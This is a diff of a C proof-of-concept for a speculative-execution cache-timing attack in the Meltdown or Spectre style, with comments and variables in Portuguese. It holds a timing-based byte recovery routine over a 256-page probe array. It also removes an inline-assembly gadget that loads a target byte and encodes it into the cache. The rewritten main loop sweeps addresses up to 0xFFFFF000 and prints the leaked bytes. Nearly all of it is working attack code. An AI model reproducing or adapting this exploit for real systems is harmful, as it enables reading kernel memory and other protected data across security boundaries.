@@ -108,7 +108,7 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 	void *base=baseSrc;
 	unsigned tempo;
 	unsigned menort=999999;
-	int i=1;
+	int i=0;
 	int isValid=0;
   	unsigned char alvo;	
 	while (i<256){
@@ -121,7 +121,6 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 			{
 			  menort=tempo;
 		  	  alvo=i;
-			  //printf("%c",i);
 
 			}
 		  isValid=1;
@@ -129,21 +128,20 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 		base++;
 		i++;
 	}
-	//printf("%c",alvo);
-	if (isSegfault)
-	{
-	
-		printf("%s",KRED);	
-		isSegfault=0;
-	}
-	else{
-	
-		printf("%s",KGRN);
-	}
-
 	if (isValid)
 	{
 	  
+	  if (isSegfault==1)
+          {
+		printf("%s",KRED);
+	
+		isSegfault=0;
+	  }
+	  else{
+
+		printf("%s",KGRN);
+	  }
+
 	  if (alvo > 'A' && alvo < '}'){
 	      printf("%c",alvo);
 	  }
@@ -152,7 +150,7 @@ static inline int FindSecret(void *baseSrc,unsigned treshold)
 	  }
 	}
 	else{
-		printf(",");
+	//printf("%s.",KBLU);
 	}
 	printf("%s",KNRM);
 	return isValid;
@@ -214,90 +212,12 @@ int lerBloco( char*segredo,unsigned threshold)
 }
 
 
-static inline void spec(char *addr , char *base )
-{
-	char dummy= 0;
-	char *buffer[210];
-	int i;
-	register char **target;
-	//printf("sizeof char *= %i\n",sizeof(char *));
-	//printf("&dummy = %p\n",&dummy);
-	for (i=0; i <100; i++)
-	{
-		buffer[i] = &dummy;
-	
-	}
-	for (i=100; i <200; i++)
-	{
-		buffer[i] = addr;
-	
-	}
-	buffer[i] = addr+1;
-	//printf("&buffer = %p\n",buffer);
-	//printf("*buffer = %p\n",buffer[0]);
-	//printf("addr = %p\n",addr);
-
-	for(target=buffer;(*target)!=addr+1; target++)
-	{
-		//target=buffer[i];
-		asm __volatile__(
-				"mov %0 ,%%edx                   			 \n"
-				"mov %1 , %%ebx                    			 \n" 
-				//.rept 50000                   					 \n" 
-			//	add $10 , %%eax                   					 \n" 
-			//	.endr                   					 \n" 
-				//nop                   					 \n" 
-				"xor %%eax, %%eax                   					 \n" 
-				"mov (%%edx), %%al                   		 \n;" 
-				"shl $12, %%eax                    \n" 
-				"mov (%%ebx,%%eax,1) , %%cl                    		\n" 
-				::"m"(*target) , "m" (base):"edx", "eax", "ecx","ebx"   );
-	
-		//printf("buffer[%i]=%p\n",i,buffer[i]);
-		//printf("*iter = %p",*iter);
-		//printf("ptr: %p,  content=%c \n",*iter,*(*iter));
-		//printf("target=%p\n",*target);
-		//printf("target=%c\n",*(*target));
-	}
-
-}
-
-static inline void ReadByte(int treshold ,int fd, char *addr , char *base )
-{
- 
-	int i;
-	int ret;
-	char buf[200];
-	void *ptrArray;
-	for(i=0; i <1; i++)
-	{
-		ptrArray=malloc(LEN_PAGE*257)+LEN_PAGE;	
-		ret = pread(fd, buf, sizeof(buf), 0);
-		if (ret < 0) {
-				perror("pread");
-				break;
-		}
-
-		spec(addr, (char *)ptrArray);
-		asm __volatile__(
-				"mfence\n"
-				"lfence\n"
-				);
-
-		FindSecret(ptrArray,treshold);
-		free(ptrArray-LEN_PAGE);	
-	
-	}
-
-}
 
 
 int main(void)
 {
-	int fd;
 	unsigned long i;
 	unsigned treshold;
-	void *ptrArray;
 	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
     printf("%sred\n", KRED);
     printf("%sgreen\n", KGRN);
@@ -316,33 +236,18 @@ int main(void)
 
 	//segredo=0xb75b2000;
 	//segredo=0xb7551000;
-	printf("segredo= %p\n",segredo);	
-	//i=0;
-	//while (segredo+i < 0xFFFFF000)
-	//{
-	  //printf("\nlendo, %p\n",segredo+i);
-  	  //lerBloco(segredo+i,treshold);
-	  //i+=LEN_PAGE*128;
 	
 	
-
-	//}
-	//segredo=(char  *)0xd983b060;
-
-
-	fd = open("/proc/version", O_RDONLY);
-	if (fd < 0) {
-		perror("open");
-		return -1;
-	}
-
-	for(i=0;i<10 ; i++)
+	i=0;
+	while (segredo+i < 0xFFFFF000)
 	{
- 
-		ReadByte(treshold,fd , segredo+i, (char *)ptrArray);
+	  printf("\nlendo, %p\n",segredo+i);
+  	  lerBloco(segredo+i,treshold);
+	  i+=LEN_PAGE*128;
+	
+	
 	}
 }
-
 
 
 
